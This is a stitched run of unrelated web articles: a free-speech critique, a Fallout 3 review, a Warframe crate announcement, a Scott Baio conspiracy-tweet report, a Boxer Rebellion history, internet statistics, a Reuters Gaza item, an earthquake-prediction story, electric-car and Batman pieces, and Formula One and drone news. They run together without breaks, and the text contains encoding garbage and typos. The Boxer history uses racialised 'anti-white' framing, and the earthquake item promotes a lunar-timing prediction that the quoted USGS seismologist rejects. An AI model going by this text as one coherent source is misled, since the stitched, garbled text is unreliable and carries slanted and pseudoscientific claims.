Neilsen simply doesn't seem aware of how her rationales for restricting speech could be deployed in ways she wouldn't like. As if to underline the point, she pulls out the old "fire in a crowded theater" trope as an example that free speech is not absolute without mentioning that the quote comes from a case where a man was arrested and convicted of violating the Espionage Act for distributing a pamphlet opposing the draft.
So, to sum up: Feinstein sees government forces shooting student protesters and concludes that colleges should restrict free speech in order to prevent violence. And Nielsen thinks censorship laws that unfairly harm or exclude the disenfranchised are arguments in favor of giving the government more power to censor speech.
Fallout 3 is a fusion of two wildly popular game franchises, in much the same way that Taco Ice Cream would be a fusion of two wildly popular foods. It takes the gameplay of Oblivion, and splices it with the setting of Fallout. There are other gameplay elements they've introduced to act as adhesive between the two disparate systems, which both add and detract from the whole in equal measure. In order to help confuse both players and (more importantly) reviewers, Fallout 3 has better gameplay than Oblivion, but a worse story than Fallout. So figuring out if the game is good or bad depends a lot on which axis you're traveling on – which of its progenitors you're using as a standard.
The name “Fallout” carries expectations with it that I can't just dismiss with a hand-wave. The fact that Fallout 3 is good doesn't change those expectations.
In case you missed it, I just admitted that Fallout 3 is good. And now I've said it twice. It was no less painful the second time, and I hope you'll not ask me to do it again. It is entertaining. Inasmuch as that's what we want from games, it is a success. Despite all my Fallout-based disappointments, this game has merit, and – amazingly enough – manages to hit a few home runs. Let's go over a few of them:
The music is excellent. Any game that has Bing Crosby in the soundtrack can't be all bad. This song in particular has been stuck in my head for days. That man was an even, undiluted mixture of talent and class. The capital wasteland is wonderfully realized. It's reportedly smaller than Oblivion's Tamriel in total square footage, but with a greater variety of interiors and a more diverse landscape, which makes it feel larger in the end. I still pine for the turn-based combat of Fallout. It was good, and now it's gone. But its loss does not change the fact that the combat in Fallout 3 is pretty fun. The VATS system – where you can pause the game and take an aimed shot at an enemy based purely on the numbers that drive your character – is about as good a compromise between the new and the old as you could hope to conceive. I can't come up with a system that would deliver the turn-based fun I crave without alienating the FPS gamers this game is courting. (Aside from cutting down on the use of slo-mo. Sweet Jambi, the constant slo-mo became a form of ocular torture after a few hours.) I haven't seen anyone else talking about this, but I think the Fallout 3 lockpicking system is the best portrayal of the activity in a videogame, ever. It's a thoroughly tactile experience, and getting that click at the end is deeply satisfying, even before the game surrenders the loot and XP. The voice acting is tremendous. Liam Neeson, Malcolm McDowell, Ron Perlman. All of them give great performances. (Most readers will naturally and unconsciously append “Duh” to the end of the preceding sentence, which is why I didn't put one there myself.) The Bethesda regulars are here again, playing the various small-time NPCs in the game. A few new actors have been added to the mix, so it doesn't feel like a world of clones the way Oblivion did.
It's a good game, (ouch again) and I can fully endorse it. This is important to say this up front, because in the next few posts I'm going to hammer away at the egregious failures of the game and I don't want you to walk away with the wrong impression. This game contains greatness, but it also contains idiocy, and the idiocy is all the more lamentable for the fact that most of it would have been easy to avoid. Most reviewers would just mention these things in passing, but if you've been reading for any length of time then you know that obsessive, in-depth pedantic nitpickery is my eternal mandate, and I will fulfill that in the coming posts.
Digital Extremes has unveiled upcoming additions to the fan-dubbed “Fashion Frame” aspect of Warframe. Following in suite of the newer Warframe and Armor accessory designs, the new roster of accessories adds a whole new level of customization to the game as well changing the way you can acquire them.
Fashion Frame never looked so good. The upcoming update (internally dubbed as “The Crate of the Lotus”) implements a brand-new looting system to Warframe which will reward active players for spending time protecting the system. Alongside this new system comes one new exclusive armor set, four new sentinel skins, and a whole lot of brand-new accessories! And the best part? You don't have to pay a cent for it.
The system is simple: You obtain crates from playing and you open them with keys you obtain from trading or buying directly. For every 30 to 70 hours you play (with an internalized average of 50 hours), you will be guaranteed at least 1 crate, up to 4 per week. These crates can be stockpiled, traded with other players, or opened to obtain a variety of cosmetic items.
There will be several different types of crates you can obtain. “Lotus Supply Crates” will feature a variety of Tenno-based accessories and skins (such as Excalibur helmets) whereas the Grineer-themed “Queenie Co. Supply Crates” while be more tailored toward Grineer-related equipment (such as Nightwatch skins). There will be some overlap between the various crate types as well as a few exclusives to look out for. The types of missions you play can influence the crates you receive. The more Grineer you take down, the more likely you are to get a Grineer crate. The more Corpus you take down, the more likely you are to get a Corpus crate.
The keys to open the crates will be available on the market for 50 platinum and can be traded with other players as well. Each crate will have a different respective key (i.e. Lotus Supply Crates use Lotus Keys, Queenie Co. Supply Crates use Queeni Co. Keys, etc. When opened, the player can receive any item from that crate pool as a tradeable blueprint.
In addition to expanding on the existing accessory system, the Auxiliary accessory slot is now open for business. Miss your bunny ears, pumpkin face, or lip warmer? Check out some of the upcoming Auxiliary accessories making their way in the update! Other loot can be found within the crates such as Color Pickers, Focus Lenses, Sortie Tokens, and a chance at the High Roller Credit Bundle.

Scott Baio vehemently denied pushing a conspiracy theory Thursday after deleting a tweet purporting to show that the mother of a victim in the horrible Newtown shooting was an actor. He later apologized for the tweet.
"Me asking for thoughts on a meme does NOT mean I believe or approve of it," he said. "I asked 4 thoughts. That's it. Stop spinning untruths."
"Those that follow me clearly know I always post links or [retweet] links w/ "Thoughts" caption or commentary," he added. "It does NOT mean I agree or accept."
Online conspiracy theorists have claimed that the Newtown murders were orchestrated by the government in order to provide them with an excuse to push anti-gun laws. One of the pieces of evidence they offer is that family members of the victims look similar to those of other shooting disasters.
Baio might have changed his mind after this post from the Soto family on the Facebook page for Victoria Leigh Soto, a teacher who was killed in the horrendous attack:
"Earlier today Scott Baio shared a picture encouraging conspiracy theories having to do with Sandy Hook and Charlottesville and Heather Heyers mother," the post read.
We are deeply disappointed that someone who has such a large audience would use that audience to target victims families. We tried to reach out to Scott on Twitter and he blocked us. He is saying that he was just asking for thoughts, but what he did was encourage hateful behavior and targeted harassment against our family. When will enough be enough? We have been through hell and back dealing with hoaxers. From Megyn Kelly giving Alex Jones airtime to Scott sending out pictures to all his followers.
"We are real people at the other end of these conspiracy theories and it hurts us, deeply," the post concluded.
After being criticized for the tweet, Baio apologized for posting it in the first place.
Despite deleting the tweet, screenshots were still being shared of the missive online:
"In retrospect," he wrote, "I wish I had thought longer about retweeting that conspiracy photo. I shouldn't have sent it. It was wrong." He added a hashtag of his last name.
Kill the foreigners and the mandarin beasts. There will be no hope for the common people until the foreigners and mandarins are gone. —Battle cry of the “Boxers.”
In China, they are known as the Yihequan, or the Fists of Harmony and Justice. In the West, they are known as “Boxers,” a name that comes from their practice of Chinese martial arts and other rituals that supposedly made them impervious to Western weapons. In 1900, these suicidally brave fighters laid siege to Peking (Beijing) and Tientsin (Tianjin) for over a month, while a loose coalition of European, Japanese, and American troops scrambled to protect their resident citizens. The coalition succeeded, but the Boxer Rebellion, which began as an anti-white and nationalist movement, played a large role in priming East Asia for a global confrontation.
Ever since the two Opium Wars of the mid-19th century, China had been carved up by European powers, primarily the British and French. While the ethnically Manchu Qing dynasty remained in ostensible control and no parts of China were colonized outright, Europeans dominated Chinese trade and industry through extraterritorial concessions. A series of droughts and floods in 1898 and 1899 made conditions worse for Chinese peasants in the north, and many gravitated towards the Boxer movement.
As noted in Diana Preston's The Boxer Rebellion, the Boxers were a secret group that had its origins in various anti-Manchu movements that sought to establish a Han royal family. However, as northern China descended into increasing anarchy, the anti-Manchu societies began blaming the “white devils” rather than the Qing for their misfortunes.
Neoconservative Max Boot writes in his book The Savage Wars of Peace that the rebellion “resembled other millennial movements elsewhere . . . among peoples whose traditional way of life was crumbling before the onslaught of modernity.” In this case “modernity” meant Western civilization, Christianity, and white people themselves. Mr. Boot compares the Boxers to the Mahdists of Sudan and the Sioux Ghost Dancers of the American West.
By 1898, the primary Boxer slogan was “Support the Manchus, Destroy the Foreign.” In Shantung Province, Boxer placards read: “Heaven is now sending down eight million spirit soldiers to extirpate these foreign religions, and when this has been done there will be a timely rain [to end the drought].” For the Boxers, white foreigners were “Primary Devils,” Chinese Christians were “Secondary Devils,” and all non-Christian Chinese who collaborated with the foreigners were “Tertiary Devils.”
Anti-white, anti-Christian violence started decades before the full-scale rebellions of 1900.
In 1870, hundreds of Chinese attacked an orphanage run by the French Catholic Sisters of Charity after several Chinese orphans died from an unknown disease. Many Chinese at that time practiced traditional medicine that used wild animal parts—the kind of traditional medicine that threatens the world tiger and rhino populations today. The attackers believed that the Europeans made medicine out of the hearts and eyes of the children and that the French nuns were guilty of removing fetuses from Chinese women in order to practice Western alchemy. In its fury, the mob raped sixteen of the orphanage's nuns, chopped them into pieces, and threw them into the flames of the burning orphanage.
On All Saints' Day in 1897, Boxers hacked two German Catholic priests to death. A third managed to survive despite being repeatedly stabbed and slashed. On December 31, 1899, Boxers killed and decapitated the British missionary Sidney Brooks. Other such attacks plagued northern and central China up until the rebellion of 1900. For Europeans, the Boxers represented the “savagery” of the East that needed to be conquered by Christian civilization. An armed confrontation was inevitable.
Diana Preston notes that Europeans generally held Chinese in disdain. Citizens in the various legations in Peking wrote in letters and journals of the filth of the city and its citizens. They often used phrases such as “the worst smells imaginable,” “dusty and malodorous,” and “disgusting.” Missionaries and diplomats often treated Chinese haughtily.
Boxers finally rose up in earnest in early 1900, and by May they had surrounded Peking. Hundreds of European, American, and Japanese citizens—including women and children—were trapped. Chinese Christians also found refuge in the besieged legation quarters and the few Christian churches manned by foreign troops in Peking. They brought accounts of Boxers killing Christians and burning churches. By June 13th, the Boxers were in full control of Peking—except for the foreign quarter—and pillaged the city. They chanted “Sha! Sha!” (Kill! Kill!) as they burned Christian churches and destroyed European shops.
The “yellow” presses of America and Great Britain falsely reported in July that 1,800 white men, women, and children had been tortured, murdered, and mutilated. Editors demanded a firm response to these fabricated atrocities, and goaded a coalition into being.
The reaction in the West was typified by leaders such as Kaiser Wilhelm II of Germany. He evoked the “yellow peril,” or the belief that rising Chinese birthrates and waves of Chinese immigration to Australia, Canada, and the United States were a threat to Western civilization. Here is part of the Kaiser's message to his men when he sent then to China in 1900:
A great task awaits you: You are to revenge the grievous injustice that has been done. The Chinese have overturned the law of nations; they have mocked the sacredness of the envoy, the duties of hospitality in a way unheard of in world history. It is all the more outrageous that this crime has been committed by a nation that takes pride in its ancient culture. Show the old Prussian virtue. Present yourselves as Christians in the cheerful endurance of suffering. May honor and glory follow your banners and arms. Give the whole world an example of manliness and discipline. Should you encounter the enemy, he will be defeated! No quarter will be given! Prisoners will not be taken! . . . [M]ay the name German be affirmed by you in such a way in China that no Chinese will ever again dare to look cross-eyed at a German.
Leaders from London to St. Petersburg spoke in similar terms while the American and British press penned lurid stories about crimes against Westerners by bands of Boxers.
Richard Bassett notes in For God and Kaiser that Austro-Hungarian sailors were the first to come over fire in the defense of Peking—even before the relief missions set out. Typically portrayed as cowardly or incompetent, the sailors of the Dual Monarchy (almost all of whom were ethnic Croats) brought a Maxim machine gun to the battle and did much to shore up weak French and Belgian defenses. With only 420 men in total, the Austro-Hungarians repulsed thousands of Boxers and uniformed Chinese troops who had joined the rebels. Elsewhere, hundreds of British, French, Belgian, German, Japanese, and Russian legation guards tried to keep the Boxers out of the foreign quarter.
The first major relief effort from the West was the Seymour Expedition. On June 10, 2,100 hundred British sailors and 112 US sailors and Marines led by Admiral Edward Seymour were sent towards Peking but the small Anglo-American force was harried by Chinese troops and was unable to move effectively on Peking. Seymour had to be rescued by an allied force of 1,800 men and fell back to Tientsin, which was not captured until July 14.
Combined British, Italian, German, Russian, American, Japanese, and Austro-Hungarian forces moved towards Peking, while their compatriots in the foreign quarter managed to withstand the Boxer siege for a total of 55 days. They were finally relieved on August 15.
The battles for Peking and Tientsin eerily presaged World War I and the difficult art of coalition warfare. In some instances, the coalition barely functioned. When an initial march on Tientsin began on June 4, 1,700 Russians decided to leave their allies behind in order to take the city by themselves. Their ill-advised rush into battle was halted by 50,000 enemy troops, many of them Chinese Army regulars. The Russian retreat was covered by 140 U.S. Marines commanded by Littleton Waller. Four enlisted men earned the Medal of Honor for their part in the running firefight.
Other notable men included Marine Private Dan Daly, a future winner of two Medals of Honor. During the siege of Peking, Daly spent an entire night by himself on a defensive wall. With just a 6mm Lee Navy rifle, Daly managed to fend off hundreds of Boxer and Qing troops. When he was relieved the next day, he told fellow Marines that the Chinese had called him quonfay (“devil”) all night long. Another plucky American was Corporal Calvin P. Titus of the 14th Infantry. At Tung Pien Gate outside of Peking, Titus scaled the wall by himself and held down Boxer and Qing troops with rifle fire. This allowed fellow soldiers to enter the city and break the siege.
The Boxer Rebellion played an outsized role in the course of geopolitics between 1900 and 1945. As part of the $335 million dollar indemnity imposed on the Qing Empire by the victorious allies, the Russian government decided to take Port Arthur and occupy all of Manchuria. This in turn angered Tokyo, which sought to expand Japanese economic power throughout East Asia. The Russo-Japanese War of 1904-1905 not only helped to cause the proto-Bolshevik revolution of 1905, but it also showed Asians that white soldiers were not invincible. During the Second World War, Japanese further damaged the image of the white man by dehumanizing captured Allied POWs and white civilians.
The Boxer Rebellion also opened up a historical wound on the Chinese psyche. Chinese students today still learn about the foreign soldiers who committed sacrilege by marching through the Forbidden City. The Chinese Communist Party also used the example of the Boxers to encourage the depredations of the Red Guards. During the Cultural Revolution, which may have killed as many as two million Chinese citizens, Chinese communists sang songs about ridding China of all foreigners. Like the Boxers before them, the vanguard fighters of the Cultural Revolution participated in a peasant uprising predicated on superstition and a belief in a false religion (this time communism instead of folk customs).
Chinese see the suppression of the Boxer Rebellion and the entire 19th century as an age of shame. In order to avenge that shame, China must again reclaim its proper place as the “Celestial Kingdom.” The Chinese Communist Party spent the 1960s and 1970s giving guidance, weapons, and money to anti-Western insurgencies in Africa, Asia, and Latin America. China is not likely to use its increasing power and influence to the benefit of the increasingly beleaguered West.

Individual stats like Facebook passing the 400 million user mark, Twitter hitting 50 million tweets per day, and YouTube viewers watching 1 billion videos per day are impressive on their own, but what if we looked at Internet-related stats collectively? Jesse Thomas did just that in his video State of the Internet.
The video — created and animated by Thomas with data from multiple sources — highlights some remarkable figures and visually depicts the Internet as we know it today. It's a must-watch video for anyone trying to wrap their minds around just how immersed web technologies have become in our everyday lives.
You can watch the video below, but we've also included some of the most intriguing figures shared in the video:
- There are 1.73 billion Internet users worldwide as of September 2009. - There are 1.4 billion e-mail users worldwide, and on average we collectively send 247 billion e-mails per day. Unfortunately 200 billion of those are spam e-mails. - As of December 2009, there are 234 million websites. - Facebook gets 260 billion pageviews per month, which equals 6 million page views per minute and 37.4 trillion pageviews in a year.
ISTANBUL (Reuters) - Turkish Prime Minister Tayyip Erdoğan decried Israeli's air strikes on Gaza on Friday as a pre-election stunt and said he would discuss the crisis with Egyptian President Mohamed Mursi in Cairo this weekend.
Under Erdoğan's Islamist-rooted AK Party, Turkey has sought to use its clout as a rising democratic power in the Muslim world to increase its influence in the Middle East, distancing itself from former ally Israel.
Erdoğan said he would speak by phone with U.S. President Barack Obama later on Friday and that Ankara was also seeking talks with Russian President Vladimir Putin amid the prospect of a full Israeli ground invasion.
The United States says it has asked Turkey and Egypt to encourage the Islamist Hamas movement that rules Gaza to cease rocket fire into Israel, but Erdoğan laid the blame for the deepening crisis firmly on the Jewish state.
“Before this election they (Israel) shot these innocent people in Gaza for reasons they fabricated,” he told reporters in Istanbul. “The dominant world powers are now making the Gaza people and fighters pay, and as the Republic of Turkey we are with our brothers in Gaza and their just cause.”
Relations between Turkey - once Israel's only Muslim ally - and the Jewish state have crumbled since Israeli marines stormed a Gaza-bound aid ship in 2010 to enforce a naval blockade of the Gaza Strip, killing nine Turks in clashes with activists on board.
This week, two days of relentless Israeli air strikes on Gaza and the drafting of reserve troops have raised fears of a full ground invasion in an attempt to end militant rocket salvoes, a few of which have crashed near Israel's biggest city Tel Aviv for the first time.
Twenty-two Palestinians have died in the air strikes since Wednesday. Three Israelis were killed by a rocket on Thursday.
The Gaza conflagration has fanned the fires of a Middle East aflame with two years of Arab revolution and a civil war in Syria that threatens to spill beyond its borders.
“I hope (a) decision of the U.N. Security Council and the attitude of the dominant powers will end Israel's offensive attitude,” Erdoğan said.
“We don't have any relations with Israel left. The countries which have relations with Israel should talk to them.”
The man who says he's worked out how to PREDICT earthquakes and says the next one to hit U.S. will be on July 12
David Nabhan claims there is a pattern as to when earthquakes occur and that they can be predicted
Quakes happen during either a full or new moon - and within three hours of dawn or dusk
Earthquake prediction has been almost a taboo field of study for the United States Geological Survey and say such findings are nonsense
For decades, scientists have tried to perfect methods and analyze data in a bid to predict earthquakes before they happen and potentially save hundreds of thousands of lives.
However, an author living in Pittsburgh, Pennsylvania claims the answers are in plain sight and David Nabhan has now written a book about his remarkable findings.
Mr Nabhan, a former science teacher from California, became interested in earthquakes.
He was in charge of the emergency preparedness plan at the school where he worked.
Cracking the code: Author David Nabhan believes he has found the key to accurately predicting when an earthquake will strike and has suggested there is a pattern between them
Real science? Earthquake prediction has been almost a taboo field of study for the United States Geological Survey (USGS), the very governmental agency in charge of making progress in this area, leaving their conservative approach to draw criticism from prominent seismologists worldwide
THE PERILS OF EARTHQUAKE PREDICTION
Scientists and folklorists have used a dizzying selection of methods and theories trying to make earthquake forecasts for years, with little success. Animal behavior, changes in the weather, and seismograms have all fallen short. Scientists first turned to seismology as a predictive tool, hoping to find patterns of foreshocks that might indicate that a fault is about to slip. But nobody has been able to reliably distinguish between the waves of energy that herald a great earthquake and harmless rumblings.
He says he noticed every earthquake happened at dusk or dawn.
'I realized this sort of conscience doesn't happen in science. These dawn and dusk quakes during new and full moons are the paradigm on the west coast,' he said.
'All six great quakes that have struck in Los Angeles that have killed people since the 30s, all of them, dawn or dusk quakes', he told CBS Pittsburgh.
Mr Nabhan says that it is the 'conjoined lunar and solar gravitational tides,' that causes the quakes.
'Just imagine the muscle required to move our oceans around every day. Our fractured fault lines are not immune to this power,' he said.
The prevailing view has placed seismic forecasting in the realm of near impossibility, but Mr Nabhan insists that a number of facts infer quite the opposite.

WORLD'S DEADLIEST EARTHQUAKES
January 2010, Haiti More than 300,000 dice and over a million are displaced following magnitude 7 quakes July 1976, China Officially 242,769 dice in 7.5 strike but figure could be more than tripple that December 2004, Sumatra 9.1 earthquake struck here and caused subsequent tsunami in 14 countries. Nearly 300,000 dead and 1.7m displaced December 1920, China A magnitude 7 quakes which killed 200,000 September 1923, Japan Extreme destruction and 142,800 dead in Kanto
His book presents a persuasive and open-minded inquiry into compelling clues and data that have been downplayed or ignored for almost two centuries, connecting hundreds of scientific studies with a stunning series of historic seismic events on the US West coast during the 20th century.
Remarkable evidence gives a thought-provoking overview of how this topic has remained in scientific limbo for so many centuries, culminating in a list of hours-long higher probability windows for seismicity into the future.
Mr Nabhan lists the plain spoken reasons how and why it should be realized that it is plausible, with some degree of accuracy, to forecast the next ground-shaking catastrophe.
Mr Nabhan says that there has never been a new idea in science that wasn't accepted without a fight and claims the next earthquake will happen on July 12 and September 9, between 4:45 to 7:55 a.m. or p.m.
In his book, Mr Nabhan lists every tremor powerful enough to have caused fatalities within a 70 mile radius of Los Angeles' city center, struck Southern California between 1933 and 1994.
He states that every one of them occurred either within a tight 3 hour window at dawn or a corresponding time interval at dusk.
Two thirds of those events also took place not only either at dawn or dusk, but within 36 hours of the precise instant of new or full moon phases.
Pattern: Two thirds of recent earthquake events took place not only either at dawn or dusk, but within 36 hours of the new or full moon phases
Findings: David Nabhan, who spent 20 years as a junior high instructor in Southern California, believes the forces of gravity and where the sun and moon are could determine large temblors
The great quakes on the U.S. West Coast north of Southern California also fit this historic pattern.
The Great San Francisco Earthquake (1906) clocked in at 5:12 AM; Loma Prieta (1989) struck almost precisely 12 hours later: 5:04 PM.
Anchorage was destroyed on Good Friday, 1964 at 5:36 PM--47 minutes away from the exact moment when the Moon entered the greatest extent of it's fullness.
The last Big One on the Southern San Andreas (1857) hit Fort Tejon in the early morning.
The May 2, 1996 magnitude 5.4 Seattle earthquake, the largest in that city's history since 1965, rocked the Puget Sound area no more than 9 minutes outside the time and date forecasted in David Nabhan's first book.
Mr Nabhan suggests there is fairly solid evidence to support the hypothesis that solar and lunar tides working in tandem might actually have a hand in at least helping to trigger tremors on the West Coast.
However, U.S. Geological Survey seismologist Lucy Jones is more wary about predicting such earthquakes.
'There's a very slight correlation. Not enough to predict any earthquake out of it,' she told CBS Los Angeles said.
'People try to make patterns out of anything that scares them. We haven't found anything that looks different before a big earthquake than other times.
We get enough people sending us predictions. The slug trail lady who used to go out in her driveway and map out the slug trails in the morning and use that to predict where the next earthquake was going to happen.'
Asked about earthquake weather, Jones said, 'The reality is earthquakes happen 5 to 10 miles deep in the earth and surface weather doesn't affect anything at that depth.'
The electric car is being reborn as a cost-efficient vehicle perfect for short, one-person trips for delivery and home-care services – and if it takes off, cities will need new policies to deal with it
A new car recently made an inconspicuous debut, not in Detroit but in Jena, Germany. With zero CO2 emissions and low energy consumption, the Colibri will be the greenest car on the market when it goes into commercial production this year, its makers say.
"But we don't market the Colibri as a green vehicle,"adds Thomas delos Santos, CEO of Innovative Mobility Automobile, the company behind the car. "Who wants to buy a vehicle just because it's green? Cost efficiency is what people care about."
At €10,000 (£8,270) plus a monthly battery fee, the Colibri is inexpensive. But perhaps more importantly, its design turns city driving on its head. What started out as "basically a three-wheel bike", as delos Santos describes it, now has a motor and a chassis. But though it seats a tall man and has space for shopping bags in the boot, the Colibri still measures just 2.75 x 1.30 metres. The seat functions much the same way as race-car seat: it raises itself when the driver gets in and out of the car, then lowers itself when she or he starts driving.
"It doesn't fulfil everyone's needs, but it provides safety and comfort," delos Santos explains. "It's perfect for well-defined one-person city trips like delivery services, utility companies, and home-care services." He has a point: many cars clogging city streets belong not to families, who might need the additional space for other trips, but to businesses dispatching one employee plus equipment. Innovative Mobility Automobile is marketing the Colibri – named after the world's smallest bird – to such firms as well as to car-sharing companies.
Early next year, the Colibri will be joined by the Hiriko, another zero-emissions one-seater. And the equally tiny (2.5 x 1.5 metre) car, developed by researchers at the City Science Intiative at MIT (Massachusetts Institute of Technology) and manufactured by a Basque consortium, has an even more unorthodox feature: it can be folded, buggy-style, when parked. "People in the auto industry say, 'Why would you want to fold a car? It's more expensive,' " reports Dr Ryan Chin, one of the MIT team's leaders. "But it allows you to use less space for parking, and parking plays a huge role in cities today. Cars like the Hiriko can help cities reclaim parking space and use it for things like bikes, parks and sidewalk cafés."
Three folded Hirikos fit into one parking space, but Chin's team isn't stopping at small: it's envisioning a system where the Hirikos are parked at charging stations around the city and available to anyone in much the same way as city-run bike schemes. "The market for shared vehicles is very small right now, less than 1% of the total market, so auto-makers don't see a financial reason to develop shared cars," notes Chin. "But as the world grows denser, we have to have a new model for shared vehicles."
According to Andrew Farah, chief engineer for Chevrolet Volt, GM's popular electric car, the market is seeing the rebirth of the electric car: "We had them in the past, but they died out because gasoline was so cheap. Now they're being brought back, but the question is, how do you gain customer acceptance?" The Volt with its backup petrol option, he says, is a "perfect bridging strategy. We're building a market." GM plans to expand its range of electric vehicles and is working with utility companies to build a recharging system. VW, meanwhile, recently unveiled Nils, a zero-emission one-seater similar to the Hiriko.
The paradox, of course, is that the new, tiny, environmentally virtuous vehicles can easily lead to city streets being even more clogged. Cities will not just need new charging stations but also new policies.
Normally, ComicsAlliance Senior Writer Chris Sims answers comics and comics culture questions from our readers every week, but as Halloween approaches, things are about to get terrifying ! This month, Chris answers your spoooooooky questions... from beyond the grave!
Q: In the spirit of Halloween, what are the best instances of a hero/villain dressing up as another hero/villain? -- @sequentialmatt
A: As you might expect from a genre so steeped in costumes, masks and secret identities, the ol' costume switch has cropped up in quite a few comics. Superman and Batman have switched costumes to fool their enemies, Iron Fist once dressed up as Daredevil to help him with a trial, the Super Skrull once dressed up a Iron Fist in order to fight Namor for reasons that I never quite understood. It's a time-honored tradition.
But with all those to choose from, it probably won't surprise anyone to learn that my all-time favorite comes from Batman , who not only dressed up as a super-hero who didn't exist , but did it for the particularly Halloweenish reason that he was absolutely terrified of himself .It all went down in the classic lead story of 1957's Detective Comics #247, "The Man Who Ended Batman's Career," by Bill Finger and Sheldon Moldoff. And folks, this one starts being awesome before you even get past the cover:
Seriously: Not only does Batman have a fireplace in the Batcave that he has carved out of solid stone , presumably to add a little romantic comfort to those long winter nights spent solving riddles and figuring out how to avoid being shot by an umbrella, he's gone so far as to have tiny little bats added to the end of the metal brackets. That dude was all about branding.
And the story itself only gets better from there. Along with "Robin Dies At Dawn," the story that gave us the unnamed scientist who would become Dr. Hurt under Grant Morrison and the fantastic, haunting line "I must put away my Batman costume and retire from crimefighting," it's one of the best examples of the infamously strange '50s mindf**k stories where Batman is pushed by his enemies into a temporary bout of insanity.
In this case, Batman's brain problems manifest themselves right on page one:
As a quick aside, I love that three armed gangsters (in snappy suits and fedoras, no less) are freaking out about Robin . They are so terrified of a 12 year-old that the grown-ass man dropping out of an actual flying saucer is a complete afterthought.
Anyway, this is Starman , not to be confused with the Golden Age Starman that anyone reading comics a decade earlier might've been familiar with from his time in the Justice Society, but more on that later. This Starman is, well... he's basically Batman decked out in Hulkamania colors, right down to having a Star-Signal and a belt pouch full of metal throwing stars:
Given the similarities (and the fact that this column is all about someone wearing another super-hero's costume) it should come as no surprise that Starman is actually Bruce Wayne, who has switched to a new identity:
You might assume that the sudden change was based on a head injury that left him bleeding like Ultimate Warrior after he was cursed by Papa Shango (shout out to 1992), but I think that's just a little off-register coloring on my copy. The real reason that he's changed his identity -- and that he can never wear the Batman costume again -- is actually even weirder.
And it all has to do with this man:
This is Professor Milo , and , his introduction here is fantastic . Not only does he have henchmen that are rock-stupid even by the abysmally low standards of Gotham City hoodlums ("Duh, what's a phobia, boss?"), he also drops the extremely interesting piece of trivia that Napoleon was afraid of cats. Frankly, I'm shocked that I had to learn this from Bill Finger and Sheldon Moldoff and not Kate Beaton .
Anyway, he has a plan to give Batman some phobias, and since Professor Jonathan Crane is too busy trying to break out of Arkham Asylum to file a copyright lawsuit, he's able to go ahead with it. It's a weird plan, too, if only because the capsule he's so proud of up there becomes three different things in the span of two pages. First, it's the pill, then the pill is broken open so that "Phobia Liquid" can be poured onto a spotlight, at which time it suddenly becomes a ray that goes directly to Batman's brain.
Thus, Batman somehow gets dosed by a bat-signal spotlight, giving him a crippling fear... of bats .
This plan is genius .
It's the perfect inversion of what Batman does to criminals. His entire existence is based on the fact that -- as Finger himself legendarily wrote way back in 1939 -- criminals are a superstitious, cowardly lot, so he became something they were afraid of. Flipping it around to make Batman terrified of himself is a beautiful piece of revenge on Milo's part. Plus, it takes complete advantage of the fact that Bruce Wayne is straight up All Bat Everything. Make him too afraid to be around bats, and you've taken away his car, his plane, his anti-crime basement, everything .
Of course, it's also a great device because of what it shows us about Batman's determination. Even if he can't be Batman , he's still going to spend his time beating the living crap out of Crime, he just needs to find a different way to do it. So after accidentlaly being a complete dick to a kid while he's apparently out buying fresh produce in full costume ...
...Batman decides that it's time for a change.
Thus, he tells Commissioner Gordon that he's retiring and becomes Starman, which is pretty amazing when you consider that he's able to get a new costume and equipment that includes an actual damn flying saucer overnight. But this is, of course, a temporary solution. As soon as the criminals realize that this new guy who looks and acts just like Batman and hangs out with Robin is actually Batman (and the fact that they don't do so immediately is another testament to how dumb those goons are), they'll be able to paralyze him with fear by waving vaguely bat-shaped objects at him.
And that's why Robin decides that the best course of action is to strap Batman to a chair against his will and terrify him until he gets over it:
Robin don't shiv, y'all.
He ends up showing him all the times that his various bat-shaped objects have helped him out with a slide show involving Batman throwing things at cavemen. And amazingly, despite the fact that he has to endure hours upon hours of sheer terror, Batman eventually gets over his fear and goes back to dishing out broken jaws to the criminal underworld:
Batman: Totally a dude who will wear a costume on top of a costume just so he can freak you out after punching you in the face.
Even aside from the shot of Batman punching a dude through his own logo, "The Man Who Ended Batman's Career" ended up being a pretty influential story. Despite being a pretty obscure villain, Professor Milo managed to make a return in the '90s by showing up in Grant Morrison and Dave McKean's Arkham Asylum , and Morrison's run on the Batman titles would reference this story and others pretty heavily. Plus, Milo managed to show up as a villain on Batman: The Animated Series with his truly ridiculous haircut intact.
There's also a strong influence on a a story by Ty Templeton and Rick Burchett that ran in 1998's Batman: Gotham Adventures #3, in which the Scarecrow robs a bank and doses everyone present -- including Batman himself -- with a specialized fear toxin that makes them afraid of Batmen. Batman's paralyzed with fear of himself , and is only able to stop the scarecrow when a young fan gives him a costume that allows him to dress up as his own childhood hero, the Gray Ghost:
The most prominent influence, however, came in the pages of James Robinson's run on Starman , a book that was largely devoted to exploring and unifying the characters who bore that name, starting with Ted Knight, the Golden Age Starman and going all the way to the 31st Century for Star Boy from the Legion of Super-Heroes.
Despite the fact that Batman's twelve-page tenure as Starman had absolutely nothing to do with the Knight Family's legacy, Robinson incorporated it into his run, reviving the look and gadgets and setting them six years earlier as the mysterious Starman of 1951 :
And just to keep it in the theme of super-heroes dressing in other heroes' costumes, the Starman of 1951 turned out to be -- Spoiler Warning for a series that ended 11 years ago -- two different heroes masquerading as the same guy: David Knight, drawn out of his own time and given another shot at defending Opal City, and Charles McNider, better known as the Golden Age Dr. Mid-Nite.
So in this season of scares, keep in mind the lessons that you can learn from Batman: If something frightens you, change your name and pretend to be someone else for a little while, then have a friend make you look at it until it no longer distracts you from punching things. If it worked for him, it'll work for you too.

Red Bull claim their mechanics set a new record for the fastest ever four-wheel tyre change in Formula One.
Mark Webber's RB9 was stationary for just 2.05 seconds when it had all four wheels changed on lap 19 of the Malaysian Grand Prix.
It helped Webber towards the fastest complete pit stop time of the entire race, taking 20.736 seconds from entry to exit. The top four quickest times at Sepang were all achieved by Red Bull.
Red Bull believe five of their eight pit stops during the Malaysian Grand Prix were quicker than the previous record of 2.31 seconds set by McLaren on Jenson Button's car during last year's German Grand Prix:
Driver Lap Pit stop Time (s) Mark Webber 19 2 2.05 Sebastian Vettel 5 1 2.13 Mark Webber 7 1 2.13 Mark Webber 31 3 2.21 Mark Webber 43 4 2.26
“It's possible this season we?������ll see the magical two-second barrier breached at some point,” said the team.
“However, rather than chasing individual times, improving consistency is always the thing coveted by the crew: breaking records is merely the consequence of doing that well.”

The Finnish postal service has begun tests with drones to deliver online purchases.
